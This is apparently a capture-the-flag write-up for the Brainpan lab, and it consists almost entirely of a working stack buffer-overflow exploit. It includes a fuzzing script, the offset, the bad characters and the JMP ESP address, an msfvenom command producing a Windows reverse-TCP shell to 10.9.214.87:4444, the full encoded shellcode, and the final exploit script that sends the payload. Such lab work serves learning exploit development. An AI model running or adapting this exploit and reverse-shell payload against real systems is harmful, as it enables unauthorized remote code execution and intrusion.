# BRAINPAN

![](../.gitbook/assets/5f7ce7d44cba42dfbd2f34d50a48eb7a.png)

## FUZZING

```text
import socket, time, sys

ip = "10.10.183.139"
port = 9999
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send( string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

## OFFSET = 524

```text
35724134
```

## BADCHARS

```text
\x00
```

## JMP ESP

```text
0x311712f3
```

## SHELLCODE

```text
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.214.87 LPORT=4444 --platform windows -a x86 -e x86/shikata_ga_nai -b 'x00' EXITFUNC=thread -f py
```

```text
buf =  ""
buf += "\xdb\xcf\xba\xf1\xe7\xdd\x89\xd9\x74\x24\xf4\x5d\x2b"
buf += "\xc9\xb1\x52\x31\x55\x17\x83\xed\xfc\x03\xa4\xf4\x3f"
buf += "\x7c\xba\x13\x3d\x7f\x42\xe4\x22\x09\xa7\xd5\x62\x6d"
buf += "\xac\x46\x53\xe5\xe0\x6a\x18\xab\x10\xf8\x6c\x64\x17"
buf += "\x49\xda\x52\x16\x4a\x77\xa6\x39\xc8\x8a\xfb\x99\xf1"
buf += "\x44\x0e\xd8\x36\xb8\xe3\x88\xef\xb6\x56\x3c\x9b\x83"
buf += "\x6a\xb7\xd7\x02\xeb\x24\xaf\x25\xda\xfb\xbb\x7f\xfc"
buf += "\xfa\x68\xf4\xb5\xe4\x6d\x31\x0f\x9f\x46\xcd\x8e\x49"
buf += "\x97\x2e\x3c\xb4\x17\xdd\x3c\xf1\x90\x3e\x4b\x0b\xe3"
buf += "\xc3\x4c\xc8\x99\x1f\xd8\xca\x3a\xeb\x7a\x36\xba\x38"
buf += "\x1c\xbd\xb0\xf5\x6a\x99\xd4\x08\xbe\x92\xe1\x81\x41"
buf += "\x74\x60\xd1\x65\x50\x28\x81\x04\xc1\x94\x64\x38\x11"
buf += "\x77\xd8\x9c\x5a\x9a\x0d\xad\x01\xf3\xe2\x9c\xb9\x03"
buf += "\x6d\x96\xca\x31\x32\x0c\x44\x7a\xbb\x8a\x93\x7d\x96"
buf += "\x6b\x0b\x80\x19\x8c\x02\x47\x4d\xdc\x3c\x6e\xee\xb7"
buf += "\xbc\x8f\x3b\x17\xec\x3f\x94\xd8\x5c\x80\x44\xb1\xb6"
buf += "\x0f\xba\xa1\xb9\xc5\xd3\x48\x40\x8e\xd1\x85\x9c\x19"
buf += "\x8e\x97\x20\xb7\x12\x11\xc6\xdd\xba\x77\x51\x4a\x22"
buf += "\xd2\x29\xeb\xab\xc8\x54\x2b\x27\xff\xa9\xe2\xc0\x8a"
buf += "\xb9\x93\x20\xc1\xe3\x32\x3e\xff\x8b\xd9\xad\x64\x4b"
buf += "\x97\xcd\x32\x1c\xf0\x20\x4b\xc8\xec\x1b\xe5\xee\xec"
buf += "\xfa\xce\xaa\x2a\x3f\xd0\x33\xbe\x7b\xf6\x23\x06\x83"
buf += "\xb2\x17\xd6\xd2\x6c\xc1\x90\x8c\xde\xbb\x4a\x62\x89"
buf += "\x2b\x0a\x48\x0a\x2d\x13\x85\xfc\xd1\xa2\x70\xb9\xee"
buf += "\x0b\x15\x4d\x97\x71\x85\xb2\x42\x32\xa5\x50\x46\x4f"
buf += "\x4e\xcd\x03\xf2\x13\xee\xfe\x31\x2a\x6d\x0a\xca\xc9"
buf += "\x6d\x7f\xcf\x96\x29\x6c\xbd\x87\xdf\x92\x12\xa7\xf5"
```

## FINAL SCRIPT

```text
import socket

ip = "10.10.119.133"
port = 9999

offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 10

buf =  ""
buf += "\xdb\xcf\xba\xf1\xe7\xdd\x89\xd9\x74\x24\xf4\x5d\x2b"
buf += "\xc9\xb1\x52\x31\x55\x17\x83\xed\xfc\x03\xa4\xf4\x3f"
buf += "\x7c\xba\x13\x3d\x7f\x42\xe4\x22\x09\xa7\xd5\x62\x6d"
buf += "\xac\x46\x53\xe5\xe0\x6a\x18\xab\x10\xf8\x6c\x64\x17"
buf += "\x49\xda\x52\x16\x4a\x77\xa6\x39\xc8\x8a\xfb\x99\xf1"
buf += "\x44\x0e\xd8\x36\xb8\xe3\x88\xef\xb6\x56\x3c\x9b\x83"
buf += "\x6a\xb7\xd7\x02\xeb\x24\xaf\x25\xda\xfb\xbb\x7f\xfc"
buf += "\xfa\x68\xf4\xb5\xe4\x6d\x31\x0f\x9f\x46\xcd\x8e\x49"
buf += "\x97\x2e\x3c\xb4\x17\xdd\x3c\xf1\x90\x3e\x4b\x0b\xe3"
buf += "\xc3\x4c\xc8\x99\x1f\xd8\xca\x3a\xeb\x7a\x36\xba\x38"
buf += "\x1c\xbd\xb0\xf5\x6a\x99\xd4\x08\xbe\x92\xe1\x81\x41"
buf += "\x74\x60\xd1\x65\x50\x28\x81\x04\xc1\x94\x64\x38\x11"
buf += "\x77\xd8\x9c\x5a\x9a\x0d\xad\x01\xf3\xe2\x9c\xb9\x03"
buf += "\x6d\x96\xca\x31\x32\x0c\x44\x7a\xbb\x8a\x93\x7d\x96"
buf += "\x6b\x0b\x80\x19\x8c\x02\x47\x4d\xdc\x3c\x6e\xee\xb7"
buf += "\xbc\x8f\x3b\x17\xec\x3f\x94\xd8\x5c\x80\x44\xb1\xb6"
buf += "\x0f\xba\xa1\xb9\xc5\xd3\x48\x40\x8e\xd1\x85\x9c\x19"
buf += "\x8e\x97\x20\xb7\x12\x11\xc6\xdd\xba\x77\x51\x4a\x22"
buf += "\xd2\x29\xeb\xab\xc8\x54\x2b\x27\xff\xa9\xe2\xc0\x8a"
buf += "\xb9\x93\x20\xc1\xe3\x32\x3e\xff\x8b\xd9\xad\x64\x4b"
buf += "\x97\xcd\x32\x1c\xf0\x20\x4b\xc8\xec\x1b\xe5\xee\xec"
buf += "\xfa\xce\xaa\x2a\x3f\xd0\x33\xbe\x7b\xf6\x23\x06\x83"
buf += "\xb2\x17\xd6\xd2\x6c\xc1\x90\x8c\xde\xbb\x4a\x62\x89"
buf += "\x2b\x0a\x48\x0a\x2d\x13\x85\xfc\xd1\xa2\x70\xb9\xee"
buf += "\x0b\x15\x4d\x97\x71\x85\xb2\x42\x32\xa5\x50\x46\x4f"
buf += "\x4e\xcd\x03\xf2\x13\xee\xfe\x31\x2a\x6d\x0a\xca\xc9"
buf += "\x6d\x7f\xcf\x96\x29\x6c\xbd\x87\xdf\x92\x12\xa7\xf5"

buffer = overflow + retn + padding + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```

![](../.gitbook/assets/f32977a349284be88d518e76148423c6.png)

